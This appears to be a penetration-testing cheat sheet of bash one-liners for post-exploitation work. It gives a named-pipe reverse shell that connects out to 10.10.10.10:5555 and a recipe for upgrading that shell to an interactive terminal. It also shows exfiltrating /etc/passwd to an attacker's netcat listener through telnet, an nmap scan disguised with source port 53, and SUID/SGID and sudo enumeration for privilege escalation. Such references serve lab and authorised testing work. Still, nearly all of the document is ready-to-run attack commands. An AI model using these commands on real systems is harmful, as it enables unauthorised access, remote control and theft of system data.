# Upgrading reverse shell to fully interactive
```bash
# Make sure you are using bash on the host machine
# Press Ctrl+Z once the connection is established
$ stty raw -echo
$ fg
$ reset
$ export TERM=xterm
```

# Exfiltrate files from target
```bash
# While having a listener on the attacker machine, started with:
$ nc -nlvp 1234 > outfile
# ...do
$ cat /etc/passwd | telnet <attackerIP> 1234
```
# View sudo privileges for user
```bash
$ sudo -l -U <user>
```

# Slow comprehensive nmap scan
The scan can be said to be a "Intense scan plus UDP" plus some extras features. It will put a whole lot of effort into host detection, not giving up if the initial ping request fails. It uses three different protocols in order to detect the hosts; TCP, UDP and SCTP. If a host is detected it will do its best in determining what OS, services and versions the host are running based on the most common TCP and UDP services. Also the scan camouflages itself as source port 53 (DNS).
```bash
$ sudo nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 –script "default or (discovery and safe)" <target>
```

# Reverse shell with nc, sh and named pipes
```bash
$ /bin/sh -c rm /tmp/gg;mkfifo /tmp/gg;cat /tmp/gg|/bin/sh -i 2>&1|nc 10.10.10.10 5555 >/tmp/gg
```

# Find all SUID files
```bash
$ find / -perm -4000 -exec ls -lah {} \; 2>/dev/null
```

# Find all SGID files
```bash
$ find / -perm -2000 -exec ls -lah {} \; 2>/dev/null
```
